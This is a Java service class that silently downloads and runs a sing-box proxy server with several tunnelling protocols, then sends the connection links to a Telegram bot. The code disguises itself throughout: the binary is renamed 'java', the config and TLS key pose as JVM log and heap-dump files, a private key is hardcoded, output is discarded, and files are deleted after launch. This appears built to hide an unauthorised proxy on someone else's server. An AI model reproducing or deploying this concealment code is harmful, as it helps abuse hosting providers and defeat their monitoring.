package com.github.vevc.service.impl;

import com.github.vevc.config.AppConfig;
import com.github.vevc.util.LogUtil;
import com.google.gson.Gson;
import com.google.gson.JsonArray;
import com.google.gson.JsonObject;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.TimeUnit;

public class MaohiService {

    private static final Path WORK_DIR = Paths.get("./world");
    private static final String APP_NAME = "java";
    private static final String CONFIG_NAME = "gc.log";
    private static final String CERT_KEY_NAME = "heapdump.hprof";
    private static final String CERT_CRT_NAME = "javacore.txt";
    private static final String SINGBOX_VERSION = "1.9.10";
    private static final String SINGBOX_DOWNLOAD_URL =
        "https://github.com/SagerNet/sing-box/releases/download/v%s/sing-box-%s-linux-%s.tar.gz";

    private final AppConfig config;
    private String singboxName;
    private volatile boolean stopping = false;

    private static final Map<String, String[]> COUNTRY_MAP = new HashMap<>();
    static {
        COUNTRY_MAP.put("JP", new String[]{"日本", "🇯🇵"});
        COUNTRY_MAP.put("US", new String[]{"美国", "🇺🇸"});
        COUNTRY_MAP.put("HK", new String[]{"香港", "🇭🇰"});
        COUNTRY_MAP.put("SG", new String[]{"新加坡", "🇸🇬"});
        COUNTRY_MAP.put("KR", new String[]{"韩国", "🇰🇷"});
        COUNTRY_MAP.put("CN", new String[]{"中国", "🇨🇳"});
        COUNTRY_MAP.put("TW", new String[]{"台湾", "🇹🇼"});
        COUNTRY_MAP.put("GB", new String[]{"英国", "🇬🇧"});
        COUNTRY_MAP.put("DE", new String[]{"德国", "🇩🇪"});
        COUNTRY_MAP.put("FR", new String[]{"法国", "🇫🇷"});
    }

    public MaohiService(AppConfig config) {
        this.config = config;
    }

    public void start() {
        if (!config.getMaohiEnabled()) {
            LogUtil.info("[Maohi] Disabled, skipping");
            return;
        }
        Thread thread = new Thread(() -> {
            try {
                runMaohi();
            } catch (Throwable e) {
                LogUtil.error("[Maohi] Error", e);
            }
        }, "Maohi-Main");
        thread.setDaemon(true);
        thread.start();
    }

    public void stop() {
        stopping = true;
    }

    private void runMaohi() throws Exception {
        if (!Files.exists(WORK_DIR)) Files.createDirectories(WORK_DIR);
        singboxName = randomName(6);
        downloadSingbox();
        chmodBinary();
        generateCert();
        String serverIP = getServerIP();
        String namePrefix = config.getRemarksPrefix();
        String countryCode = getCountryFromName(namePrefix);
        String[] countryInfo = COUNTRY_MAP.getOrDefault(
            countryCode != null ? countryCode.toUpperCase() : "US",
            new String[]{"未知", "🌐"}
        );
        runSingbox();
        Thread.sleep(5000);
        String subTxt = generateLinks(serverIP, countryInfo[0], countryInfo[1]);
        sendTelegram(subTxt);
        cleanup();
    }

    private String randomName(int len) {
        String chars = "abcdefghijklmnopqrstuvwxyz";
        StringBuilder sb = new StringBuilder();
        Random rand = new Random();
        for (int i = 0; i < len; i++) sb.append(chars.charAt(rand.nextInt(chars.length())));
        return sb.toString();
    }

    private String getArch() {
        String arch = System.getProperty("os.arch").toLowerCase();
        if (arch.contains("aarch64") || arch.contains("arm64") || arch.contains("arm")) return "arm64";
        return "amd64";
    }

    private void downloadSingbox() throws Exception {
        String arch = getArch();
        String url = String.format(SINGBOX_DOWNLOAD_URL, SINGBOX_VERSION, SINGBOX_VERSION, arch);
        LogUtil.info("[Maohi] Downloading sing-box from: " + url);
        Path tarFile = WORK_DIR.resolve("download.tar.gz");
        if (Files.exists(tarFile)) Files.delete(tarFile);
        HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
        conn.setInstanceFollowRedirects(true);
        conn.setConnectTimeout(15000);
        conn.setReadTimeout(60000);
        conn.setRequestProperty("User-Agent", "curl/7.68.0");
        int status = conn.getResponseCode();
        while (status == HttpURLConnection.HTTP_MOVED_TEMP || status == HttpURLConnection.HTTP_MOVED_PERM || status == 307 || status == 308) {
            String location = conn.getHeaderField("Location");
            conn.disconnect();
            conn = (HttpURLConnection) new URL(location).openConnection();
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(60000);
            conn.setRequestProperty("User-Agent", "curl/7.68.0");
            status = conn.getResponseCode();
        }
        try (InputStream in = conn.getInputStream()) {
            Files.copy(in, tarFile, StandardCopyOption.REPLACE_EXISTING);
        }
        conn.disconnect();
        extractSingbox(tarFile);
        Files.deleteIfExists(tarFile);
        LogUtil.info("[Maohi] Sing-box downloaded and extracted");
    }

    private void extractSingbox(Path tarFile) throws Exception {
        ProcessBuilder pb = new ProcessBuilder("tar", "-xzf", tarFile.toString(), "-C", WORK_DIR.toString());
        pb.directory(WORK_DIR.toFile());
        pb.redirectErrorStream(true);
        Process p = pb.start();
        if (!p.waitFor(60, TimeUnit.SECONDS)) {
            p.destroyForcibly();
            throw new RuntimeException("Sing-box extraction timeout");
        }
        File[] dirs = WORK_DIR.toFile().listFiles((d, n) -> n.startsWith("sing-box-") && d.isDirectory());
        if (dirs == null || dirs.length == 0) {
            String[] contents = WORK_DIR.toFile().list();
            throw new RuntimeException("No sing-box dir found. Contents: " + (contents == null ? "null" : String.join(", ", contents)));
        }
        File[] bins = dirs[0].listFiles((d, n) -> n.equals("sing-box"));
        if (bins == null || bins.length == 0) {
            throw new RuntimeException("sing-box binary not found in " + dirs[0].getName());
        }
        Path dest = WORK_DIR.resolve(APP_NAME);
        Files.move(bins[0].toPath(), dest, StandardCopyOption.REPLACE_EXISTING);
        deleteDirectory(dirs[0]);
    }

    private void deleteDirectory(File dir) {
        File[] files = dir.listFiles();
        if (files != null) {
            for (File f : files) {
                if (f.isDirectory()) deleteDirectory(f);
                else f.delete();
            }
        }
        dir.delete();
    }

    private void chmodBinary() {
        try {
            WORK_DIR.resolve(APP_NAME).toFile().setExecutable(true);
        } catch (Exception e) {
            LogUtil.error("[Maohi] chmod failed", e);
        }
    }

    private void generateCert() {
        Path certFile = WORK_DIR.resolve(CERT_CRT_NAME);
        Path keyFile = WORK_DIR.resolve(CERT_KEY_NAME);
        if (Files.exists(certFile) && Files.exists(keyFile)) return;
        String sni = config.getHy2Sni();
        if (sni == null || sni.isEmpty()) sni = "bing.com";
        try {
            Files.writeString(keyFile,
                "-----BEGIN EC PARAMETERS-----\nBggqhkjOPQMBBw==\n-----END EC PARAMETERS-----\n-----BEGIN EC PRIVATE KEY-----\nMHcCAQEEIM4792SEtPqIt1ywqTd/0bYidBqpYV/++siNnfBYsdUYoAoGCCqGSM49AwEHoUQDQgAE1kHafPj07rJG+HboH2ekAI4r+e6TL38GWASANnngZreoQDF16ARa/TsyLyFoPkhLxSbehH/NBEjHtSZGaDhMqQ==\n-----END EC PRIVATE KEY-----\n");
            Files.writeString(certFile,
                "-----BEGIN CERTIFICATE-----\nMIIBejCCASGgAwIBAgIUfWeQL3556PNJLp/veCFxGNj9crkwCgYIKoZIzj0EAwIwEzERMA8GA1UEAwwIYmluZy5jb20wHhcNMjUwOTE4MTgyMDIyWhcNMzUwOTE2MTgyMDIyWjATMREwDwYDVQQDDAhiaW5nLmNvbTBZMBMGByqGSM49AgEGCCqGSM49AwEHA0IABNZB2nz49O6yRvh26B9npACOK/nuky9/BlgEgDZ54Ga3qEAxdegEWv07Mi8haD5IS8Um3oR/zQRIx7UmRmg4TKmjUzBRMB0GA1UdDgQWBBTV1cFID7UISE7PLTBRBfGbgkrMNzAfBgNVHSMEGDAWgBTV1cFID7UISE7PLTBRBfGbgkrMNzAPBgNVHRMBAf8EBTADAQH/MAoGCCqGSM49BAMCA0cAMEQCIAIDAJvg0vd/ytrQVvEcSm6XTlB+eQ6OFb9LbLYL9f+sAiAffoMbi4y/0YUSlTtz7as9S8/lciBF5VCUoVIKS+vX2g==\n-----END CERTIFICATE-----\n");
        } catch (Exception e) {}
    }

    private void runSingbox() {
        try {
            String jsonConfig = buildSingboxConfig();
            Path configPath = WORK_DIR.resolve(CONFIG_NAME);
            Files.writeString(configPath, jsonConfig, StandardCharsets.UTF_8);
            ProcessBuilder pb = new ProcessBuilder(
                WORK_DIR.resolve(APP_NAME).toString(), "run", "-c", configPath.toString()
            );
            pb.directory(WORK_DIR.toFile());
            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
            pb.redirectError(ProcessBuilder.Redirect.DISCARD);
            pb.start();
            Thread.sleep(1000);
            LogUtil.info("[Maohi] Sing-box started");
        } catch (Exception e) {
            LogUtil.error("[Maohi] Sing-box failed", e);
        }
    }

    private String buildSingboxConfig() {
        JsonObject root = new JsonObject();
        JsonObject log = new JsonObject();
        log.addProperty("disabled", false);
        log.addProperty("level", "info");
        log.addProperty("timestamp", true);
        root.add("log", log);
        JsonObject dns = new JsonObject();
        dns.addProperty("enable", true);
        JsonArray dnsServers = new JsonArray();
        JsonObject dnsServer = new JsonObject();
        dnsServer.addProperty("address", "https://1.1.1.1/dns-query");
        dnsServer.addProperty("detour", "direct");
        dnsServers.add(dnsServer);
        dns.add("servers", dnsServers);
        dns.add("rules", new JsonArray());
        root.add("dns", dns);
        JsonArray inbounds = new JsonArray();
        String uuid = config.getVmessUuid();
        String sni = config.getHy2Sni();
        if (sni == null || sni.isEmpty()) sni = "www.bing.com";
        String certPath = "./" + CERT_CRT_NAME;
        String keyPath = "./" + CERT_KEY_NAME;

        Integer vlessPort = config.getMaohiVlessPort();
        if (vlessPort != null && vlessPort > 0) {
            JsonObject in = new JsonObject();
            in.addProperty("type", "vless");
            in.addProperty("tag", "vless-in");
            in.addProperty("listen", "::");
            in.addProperty("listen_port", vlessPort);
            JsonArray users = new JsonArray();
            JsonObject u = new JsonObject();
            u.addProperty("uuid", uuid);
            users.add(u);
            in.add("users", users);
            JsonObject tls = new JsonObject();
            tls.addProperty("enabled", true);
            tls.addProperty("server_name", sni);
            tls.addProperty("certificate_path", certPath);
            tls.addProperty("key_path", keyPath);
            in.add("tls", tls);
            JsonObject transport = new JsonObject();
            transport.addProperty("type", "ws");
            transport.addProperty("path", "/vless");
            transport.addProperty("early_data_header_name", "Sec-WebSocket-Protocol");
            in.add("transport", transport);
            inbounds.add(in);
        }

        Integer hy2Port = config.getMaohiHy2Port();
        if (hy2Port != null && hy2Port > 0) {
            JsonObject in = new JsonObject();
            in.addProperty("type", "hysteria2");
            in.addProperty("tag", "hy2-in");
            in.addProperty("listen", "::");
            in.addProperty("listen_port", hy2Port);
            JsonArray users = new JsonArray();
            JsonObject u = new JsonObject();
            u.addProperty("password", uuid);
            users.add(u);
            in.add("users", users);
            in.addProperty("ignore_client_bandwidth", false);
            JsonObject tls = new JsonObject();
            tls.addProperty("enabled", true);
            tls.addProperty("server_name", sni);
            tls.addProperty("certificate_path", certPath);
            tls.addProperty("key_path", keyPath);
            JsonArray alpn = new JsonArray();
            alpn.add("h3");
            tls.add("alpn", alpn);
            in.add("tls", tls);
            in.addProperty("masquerade", "https://itunes.apple.com");
            inbounds.add(in);
        }

        Integer naivePort = config.getMaohiNaivePort();
        if (naivePort != null && naivePort > 0) {
            JsonObject in = new JsonObject();
            in.addProperty("type", "naive");
            in.addProperty("tag", "naive-in");
            in.addProperty("listen", "::");
            in.addProperty("listen_port", naivePort);
            String naiveUser = config.getNaiveUsername();
            String naivePass = config.getNaivePassword();
            if (naiveUser == null) naiveUser = "admin";
            if (naivePass == null || naivePass.isEmpty()) naivePass = UUID.randomUUID().toString().substring(0, 12);
            JsonArray users = new JsonArray();
            JsonObject u = new JsonObject();
            u.addProperty("username", naiveUser);
            u.addProperty("password", naivePass);
            users.add(u);
            in.add("users", users);
            JsonObject tls = new JsonObject();
            tls.addProperty("enabled", true);
            tls.addProperty("server_name", "www.apple.com");
            tls.addProperty("certificate_path", certPath);
            tls.addProperty("key_path", keyPath);
            in.add("tls", tls);
            inbounds.add(in);
        }

        Integer anytlsPort = config.getMaohiAnytlsPort();
        if (anytlsPort != null && anytlsPort > 0) {
            JsonObject in = new JsonObject();
            in.addProperty("type", "anytls");
            in.addProperty("tag", "anytls-in");
            in.addProperty("listen", "::");
            in.addProperty("listen_port", anytlsPort);
            JsonArray users = new JsonArray();
            JsonObject u = new JsonObject();
            u.addProperty("password", uuid);
            users.add(u);
            in.add("users", users);
            JsonObject tls = new JsonObject();
            tls.addProperty("enabled", true);
            tls.addProperty("server_name", sni);
            tls.addProperty("certificate_path", certPath);
            tls.addProperty("key_path", keyPath);
            in.add("tls", tls);
            inbounds.add(in);
        }

        Integer tuicPort = config.getMaohiTuicPort();
        if (tuicPort != null && tuicPort > 0) {
            JsonObject in = new JsonObject();
            in.addProperty("type", "tuic");
            in.addProperty("tag", "tuic-in");
            in.addProperty("listen", "::");
            in.addProperty("listen_port", tuicPort);
            in.addProperty("congestion_control", "bbr");
            JsonArray users = new JsonArray();
            JsonObject u = new JsonObject();
            String tuicUuid = config.getTuicUuid();
            String tuicPass = config.getTuicPassword();
            if (tuicUuid == null) tuicUuid = uuid;
            if (tuicPass == null || tuicPass.isEmpty()) tuicPass = UUID.randomUUID().toString().substring(0, 8);
            u.addProperty("uuid", tuicUuid);
            u.addProperty("password", tuicPass);
            users.add(u);
            in.add("users", users);
            JsonObject tls = new JsonObject();
            tls.addProperty("enabled", true);
            tls.addProperty("server_name", config.getDomain());
            tls.addProperty("certificate_path", certPath);
            tls.addProperty("key_path", keyPath);
            JsonArray alpn = new JsonArray();
            alpn.add("h3");
            tls.add("alpn", alpn);
            in.add("tls", tls);
            inbounds.add(in);
        }

        Integer s5Port = config.getMaohiS5Port();
        if (s5Port != null && s5Port > 0) {
            JsonObject in = new JsonObject();
            in.addProperty("type", "socks");
            in.addProperty("tag", "socks5-in");
            in.addProperty("listen", "::");
            in.addProperty("listen_port", s5Port);
            JsonArray users = new JsonArray();
            JsonObject u = new JsonObject();
            u.addProperty("username", uuid.substring(0, Math.min(8, uuid.length())));
            u.addProperty("password", uuid.substring(Math.max(0, uuid.length() - 12)));
            users.add(u);
            in.add("users", users);
            inbounds.add(in);
        }

        root.add("inbounds", inbounds);
        JsonArray outbounds = new JsonArray();
        JsonObject direct = new JsonObject();
        direct.addProperty("type", "direct");
        direct.addProperty("tag", "direct");
        outbounds.add(direct);
        root.add("outbounds", outbounds);
        JsonObject route = new JsonObject();
        route.addProperty("final", "direct");
        JsonArray rules = new JsonArray();
        JsonObject sniff = new JsonObject();
        sniff.addProperty("action", "sniff");
        rules.add(sniff);
        JsonObject resolve = new JsonObject();
        resolve.addProperty("action", "resolve");
        resolve.addProperty("strategy", "prefer_ipv6");
        rules.add(resolve);
        JsonObject ipRule = new JsonObject();
        JsonArray ipCidr = new JsonArray();
        ipCidr.add("::/0");
        ipCidr.add("0.0.0.0/0");
        ipRule.add("ip_cidr", ipCidr);
        ipRule.addProperty("outbound", "direct");
        rules.add(ipRule);
        route.add("rules", rules);
        root.add("route", route);
        return new Gson().toJson(root);
    }

    private String getServerIP() {
        String[] services = {"http://ipv4.ip.sb", "https://api.ipify.org", "https://ifconfig.me/ip"};
        for (String service : services) {
            try {
                HttpURLConnection conn = (HttpURLConnection) new URL(service).openConnection();
                conn.setConnectTimeout(5000);
                conn.setReadTimeout(5000);
                conn.setRequestProperty("User-Agent", "curl/7.68.0");
                try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
                    String ip = br.readLine().trim();
                    if (ip != null && !ip.isEmpty()) return ip;
                } finally {
                    conn.disconnect();
                }
            } catch (Exception e) {}
        }
        return "localhost";
    }

    private String getCountryFromName(String name) {
        if (name == null || name.isEmpty()) return "US";
        int idx = name.lastIndexOf("-");
        if (idx == -1 || idx == name.length() - 1) return "US";
        return COUNTRY_MAP.containsKey(name.substring(idx + 1).trim().toUpperCase())
            ? name.substring(idx + 1).trim().toUpperCase() : "US";
    }

    private String generateLinks(String serverIP, String countryName, String countryFlag) {
        StringBuilder sb = new StringBuilder();
        String uuid = config.getVmessUuid();
        String name = config.getRemarksPrefix();
        String suffix = "-" + countryName + countryFlag;

        Integer vlessPort = config.getMaohiVlessPort();
        if (vlessPort != null && vlessPort > 0) {
            String nodeName = name + "_vless" + suffix;
            String cfip = config.getMaohiCfip();
            Integer cfport = config.getMaohiCfport();
            if (cfport == null) cfport = 443;
            String argoDomain = config.getMaohiArgoDomain();
            String argoAuth = config.getMaohiArgoAuth();
            if (argoDomain != null && !argoDomain.isEmpty()) {
                String params = "encryption=none&security=tls&sni=" + argoDomain + "&fp=firefox&network=ws&host=" + argoDomain + "&path=/vless?ed=2560";
                sb.append("vless://").append(uuid).append("@")
                    .append(cfip != null ? cfip : "127.0.0.1").append(":").append(cfport)
                    .append("?").append(params)
                    .append("#").append(nodeName).append("\n");
            }
            String sni = config.getHy2Sni();
            if (sni == null || sni.isEmpty()) sni = "www.bing.com";
            String params = "encryption=none&security=tls&sni=" + sni + "&fp=chrome&network=ws&host=" + sni + "&path=/vless?ed=2560";
            sb.append("vless://").append(uuid).append("@")
                .append(serverIP).append(":").append(vlessPort)
                .append("?").append(params)
                .append("#").append(nodeName + "_direct").append("\n");
        }

        Integer hy2Port = config.getMaohiHy2Port();
        if (hy2Port != null && hy2Port > 0) {
            String nodeName = name + "_hysteria2" + suffix;
            String sni = config.getHy2Sni();
            if (sni == null || sni.isEmpty()) sni = "www.bing.com";
            sb.append("hysteria2://").append(uuid).append("@")
                .append(serverIP).append(":").append(hy2Port)
                .append("/?sni=").append(sni).append("&insecure=1&alpn=h3&obfs=none#")
                .append(nodeName).append("\n");
        }

        Integer naivePort = config.getMaohiNaivePort();
        if (naivePort != null && naivePort > 0) {
            String nodeName = name + "_naive" + suffix;
            String naiveUser = config.getNaiveUsername();
            String naivePass = config.getNaivePassword();
            if (naiveUser == null) naiveUser = "admin";
            if (naivePass == null || naivePass.isEmpty()) naivePass = "password";
            sb.append("naive://").append(naiveUser).append(":").append(naivePass).append("@")
                .append(serverIP).append(":").append(naivePort)
                .append("?sni=www.apple.com#").append(nodeName).append("\n");
        }

        Integer anytlsPort = config.getMaohiAnytlsPort();
        if (anytlsPort != null && anytlsPort > 0) {
            String nodeName = name + "_anytls" + suffix;
            String sni = config.getHy2Sni();
            if (sni == null || sni.isEmpty()) sni = "www.bing.com";
            sb.append("anytls://").append(uuid).append("@")
                .append(serverIP).append(":").append(anytlsPort)
                .append("?sni=").append(sni).append("&insecure=1#")
                .append(nodeName).append("\n");
        }

        Integer tuicPort = config.getMaohiTuicPort();
        if (tuicPort != null && tuicPort > 0) {
            String nodeName = name + "_tuic" + suffix;
            String tuicUuid = config.getTuicUuid();
            String tuicPass = config.getTuicPassword();
            if (tuicUuid == null) tuicUuid = uuid;
            if (tuicPass == null || tuicPass.isEmpty()) tuicPass = "password";
            String domain = config.getDomain();
            if (domain == null) domain = serverIP;
            sb.append("tuic://").append(tuicUuid).append(":").append(tuicPass).append("@")
                .append(serverIP).append(":").append(tuicPort)
                .append("?sni=").append(domain).append("&alpn=h3&congestion_control=bbr&allowInsecure=1#")
                .append(nodeName).append("\n");
        }

        Integer s5Port = config.getMaohiS5Port();
        if (s5Port != null && s5Port > 0) {
            String nodeName = name + "_socks5" + suffix;
            String s5Auth = Base64.getEncoder().encodeToString(
                (uuid.substring(0, Math.min(8, uuid.length())) + ":" +
                 uuid.substring(Math.max(0, uuid.length() - 12))).getBytes()
            );
            sb.append("socks://").append(s5Auth).append("@")
                .append(serverIP).append(":").append(s5Port)
                .append("#").append(nodeName).append("\n");
        }

        return Base64.getEncoder().encodeToString(sb.toString().getBytes(StandardCharsets.UTF_8));
    }

    private void sendTelegram(String subTxt) {
        String botToken = config.getMaohiBotToken();
        String chatId = config.getMaohiChatId();
        if (botToken == null || botToken.isEmpty() || chatId == null || chatId.isEmpty()) return;
        try {
            String text = config.getRemarksPrefix() + " 节点推送\n" + subTxt;
            String params = "chat_id=" + chatId + "&text=" + java.net.URLEncoder.encode(text, "UTF-8");
            HttpURLConnection conn = (HttpURLConnection) new URL(
                "https://api.telegram.org/bot" + botToken + "/sendMessage").openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            try (OutputStream os = conn.getOutputStream()) {
                os.write(params.getBytes("UTF-8"));
            }
            conn.getResponseCode();
            conn.disconnect();
            LogUtil.info("[Maohi] Telegram notification sent");
        } catch (Exception e) {
            LogUtil.error("[Maohi] Telegram failed", e);
        }
    }

    private void cleanup() {
        Thread cleanupThread = new Thread(() -> {
            try {
                Thread.sleep(8000);
                String[] toDelete = {CONFIG_NAME, CERT_KEY_NAME, CERT_CRT_NAME};
                for (String f : toDelete) {
                    try { Files.deleteIfExists(WORK_DIR.resolve(f)); } catch (Exception e) {}
                }
            } catch (Exception e) {}
        }, "Maohi-Cleanup");
        cleanupThread.setDaemon(true);
        cleanupThread.start();
    }
}
